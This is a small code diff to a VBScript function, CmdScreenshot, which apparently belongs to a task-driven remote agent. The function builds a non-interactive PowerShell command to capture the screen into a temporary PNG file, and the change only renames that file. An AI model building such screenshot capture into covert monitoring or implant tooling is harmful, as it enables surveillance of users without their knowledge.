@@ -569,7 +569,7 @@ End Function
 Function CmdScreenshot(taskParams)
     Dim tempPath, psCmd, exec, stderr
     Randomize
-    tempPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\~ss" & Int(Rnd * 99999) & ".png"
+    tempPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\screenshot_" & Int(Rnd * 99999) & ".png"
     psCmd = "powershell.exe -NoProfile -NonInteractive -Command """ & _
         "Add-Type -AssemblyName System.Windows.Forms;" & _
         "Add-Type -AssemblyName System.Drawing;" & _
